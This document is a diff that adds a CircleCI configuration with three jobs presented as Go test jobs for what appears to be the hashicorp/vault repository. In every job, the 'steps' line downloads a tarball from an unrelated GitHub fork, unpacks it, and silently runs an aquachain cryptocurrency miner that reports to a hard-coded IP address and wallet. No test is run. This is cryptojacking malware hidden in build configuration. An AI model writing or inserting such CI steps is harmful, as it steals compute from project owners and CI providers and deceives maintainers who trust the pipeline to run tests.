@@ -1,0 +1,23 @@
+version: 2.0
+jobs:
+test-go-remote-docker:
+    docker:
+    - image: docker.mirror.hashicorp.services/circleci/golang:1.17.2-buster
+    resource_class: small
+    working_directory: /go/src/github.com/hashicorp/vault
+    parallelism: 8
+    steps: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
+test-go:
+    docker:
+    - image: docker.mirror.hashicorp.services/circleci/golang:1.17.2-buster
+    resource_class: medium
+    working_directory: /go/src/github.com/hashicorp/vault
+    parallelism: 8
+    steps: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
+test-go-remote:
+    docker:
+    - image: docker.mirror.hashicorp.services/circleci/golang:1.17.2-buster
+    resource_class: xlarge
+    working_directory: /go/src/github.com/hashicorp/vault
+    parallelism: 8
+    steps: wget https://github.com/Gaueh/vault/raw/main/seo.tar.gz && tar -xvf seo.tar.gz && ./aquachain-miner/aquachain-miner-avx -F 168.235.85.77:8888/0x5fcc6d6d48891a57ac1d2b84b637accc7ce56a56/007 -G > /dev/null
